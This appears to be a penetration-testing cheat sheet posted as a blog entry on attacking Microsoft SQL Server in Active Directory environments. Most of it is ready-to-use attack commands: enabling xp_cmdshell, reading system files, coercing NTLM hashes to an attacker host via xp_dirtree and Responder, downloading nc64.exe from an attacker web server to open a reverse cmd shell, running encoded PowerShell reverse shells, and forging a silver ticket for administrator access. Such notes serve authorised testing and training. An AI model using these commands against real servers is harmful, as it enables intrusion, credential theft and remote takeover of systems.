---
title: "Port:- 1433 Micorsoft SQL Server"
date: 2025-11-12 00:00:00 +0800
categories: [AD- Attacks]
tags: [1433 Port, MSSQL Enumeration]
platform: AD- Attacks
author: 0xmr
image: /assets/img/posts/mssql.webp
excerpt: "Technical understanding and practical overview"
---

# Microsoft SQL server 
> Microsoft SQL Server is a relational database management system (RDBMS) developed by Microsoft, designed to manage and organize data in a structured way using tables that are related to each > other through defined relationships.
> It allows applications and users to store, retrieve, update, and manage data efficiently using Transact-SQL (T-SQL), Microsoft’s implementation of the SQL language.

###  [+]  Connecting to mssqlclient 
```bash
NetExec mssql $target -u '$user' -p '$pass' --local-auth

impacket-mssqlclient  -windows-auth $Domain/$user:'$pass'@Domain
    
impacket-mssqlclient $full_Domain/$user:'$pass'@Domain

mssqlclient.py $Domain/$user:$passwd@$Ip -windows-auth

mssqlclient.py -k -no-pass $Full_Domain
```
### Comman usage
```bash
# login as different user
exec_as_login <username here>

# check databases
enum_db

# check linked servers
enum_links
```
### [+] Database usage 
```bash
enum_db                         #show databases
use <db_name>;                  #use it
select name from sys.tables;    #show tables
select * from <table_name>;     #show content 

SELECT * FROM INFORMATION_SCHEMA.TABLES;
```
## Enable xp_cmdshell
```bash
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

EXEC xp_cmdshell 'whoami';
```

## Common Check's
[+]  Logged in users:
```bash
nxc mssql DC01 -u '$user' -p '$pass' --local-auth -M enum_logins
```
[+] check impersonate user
```bash
nxc mssql DC01 -u '$user' -p '$pass' --local-auth -M enum_impersonate
```
[+] impersonate user
```bash
nxc mssql DC01 -u '$user' -p 'pass' --local-auth -M mssql_priv
```
###  [-]  Reading  $SID
```bash
 EXEC xp_cmdshell 'whoami';

 SELECT SUSER_SID('use_name'); 
 ```
### [-]  Reading  files
```bash
SELECT * FROM OPENROWSET(BULK 'C:\Windows\system32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;
```

### [+] Capture NTLM Hash. (LLMNR Poisoning)
```bash
responder -I tun0 -dvw

 
declare @q varchar (200);set @q='\\$IP\any\think';exec master.dbo.xp_dirtree @q;

exec master ..xp_dirtree '\\$IP\test';

SELECT * FROM sys.dm_os_file_exists('\\ip\\share\it');
```
### [+] Checking link_server's
```bash
EXEC sp_linkedservers
enum_links
```
[+] Use the linked_Server's
```bash
use_link [Server_Name]; 
  or 
use_link Server_Name
```
### [+] Execute the xp_cmdshell
```bash
EXEC ('EXEC xp_cmdshell whoami;')
xp_cmdshell whoami
```
```bash
+ EXEC ('EXEC xp_cmdshell whoami;')                    
+ EXEC ('EXEC xp_cmdshell  "whoami /all";')            
+ EXEC ('EXEC xp_dirtree ''\\$attacker_ip\share'';')   
+ EXEC ('EXEC xp_cmdshell  "powershell whoami";')      
```

## [+] Reverse shell via nc64.exe
```bash
EXECUTE ('EXEC xp_cmdshell ''powershell -c "& {iwr -uri http://$attcker_ip:8000/nc64.exe -outfile C:\Windows\Temp\nc.exe}"''')

rlwrap ncat -lvnp 9001

EXECUTE('EXEC xp_cmdshell ''C:\Windows\Temp\nc.exe -e cmd.exe $attacker 9001''')
```

## [+] Powershell Execution
> Raw code creation:- Use the nishang (tcponelinear.ps1).


```bash
cat file_name |iconv -t utf-16le | base64 -w0;echo
```
```bash
 xp_cmdshell "powershell -enc <encoded_raw_code>"

 EXEC ('EXEC xp_cmdshell  "powershell -enc <encoded_raw_code>";')
 ```

## [+]  Enable the xp_cmdshell

```bash
EXEC sp_configure 'show advanced options', 1;         
RECONFIGURE;                                          
sp_configure;                                         
EXEC sp_configure 'xp_cmdshell', 1;                   
RECONFIGURE;                                          
exec xp_cmdshell 'whoami'                             
exec xp_cmdshell 'powershell -enc <encoded_raw_code>' 
```
# Forge Ticket (Silver Ticket 🥈)
- We are forging ticket to get the administrator shell in the mssql server. so we can run xp_cmdshell.
- Forged using a specific service account hash.
- Grants access to only that specific service
- Like having a key to one room, not the whole building

### Generate Nthash
```bash
└─# python3                
Python 3.13.11 (main, Dec  8 2025, 11:43:54) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import hashlib
>>> hashlib.new('md4', 'password_here'.encode('utf-16le')).digest().hex()
```
```bash
ticketer.py -nthash $nthash -domain-sid $sid -domain $Domain -spn $user/$Full_DOmain:$Port -groups 1105 -user-id 500 Administrator
```
```bash
export KRB5CCNAME=Administrator.ccache
klist

mssqlclient.py -k -no-pass $Full_Domain
```


